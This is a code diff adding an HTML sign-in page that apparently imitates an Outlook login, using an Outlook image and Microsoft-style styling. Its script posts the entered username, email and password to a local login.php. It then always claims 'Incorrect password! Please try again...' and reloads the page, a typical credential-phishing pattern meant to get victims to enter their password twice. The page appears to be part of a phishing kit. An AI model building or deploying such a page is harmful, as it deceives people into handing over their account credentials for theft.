@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<link rel="icon" type="image/x-icon" href="./images/favicon.ico">
+
+	<meta property="og:image" content="./images/outlook.webp">
+	<meta property="og:image:width" content="1200">
+	<meta property="og:image:height" content="630">
+	
+ 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        img {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        input[type="email"],
+        input.password-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        label {
+            font-size: 14px;
+            color: #555;
+        }
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        input[type="checkbox"] {
+            margin-right: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Replace with your own image URL -->
+        <img src="./images/outlook.webp" alt="Sign In Image" width="280">
+
+        <form action="#">
+            <label for="email">Username</label>
+            <input type="email" id="email" name="user" placeholder="Username" required>
+ 
+			<label for="email">Email address</label>
+            <input type="email" id="email" name="email" placeholder="Email address" required>
+
+            <label for="password">Password</label>
+            <input type="password" class="password-input" name="password" placeholder="Password" required>
+
+            <div class="show-password">
+                <input type="checkbox" class="toggle-password">
+                <label>Show password</label>
+            </div>
+
+            <button type="button" onclick="submitForm()">Sign in</button>
+        </form>
+    </div>
+
+    <script>
+        const togglePassword = document.querySelector('.toggle-password');
+        const passwordInput = document.querySelector('.password-input');
+
+        togglePassword.addEventListener('change', function() {
+            if (this.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+    </script>
+	<script>
+		function submitForm() {
+			var formData = new FormData(document.querySelector('form'));
+			var xhr = new XMLHttpRequest();
+			xhr.open('POST', './login.php', true);
+		
+			xhr.onload = function () {
+				if (xhr.status === 200 && xhr.responseText) {
+					// Display success message or handle response as needed
+		
+					// Reload the current page after 3 seconds
+					setTimeout(function() {
+						location.reload();
+					}, 3000);
+				}
+			};
+		
+			// Handle AJAX request errors
+			xhr.onerror = function() {
+				console.error('Error submitting form');
+				// Add error handling logic if needed
+			};
+		
+			xhr.send(formData);
+			document.getElementById("dis").innerHTML = "Incorrect password! Please try again...";
+		}
+			
+		 
+		</script>
+</body>
+</html>
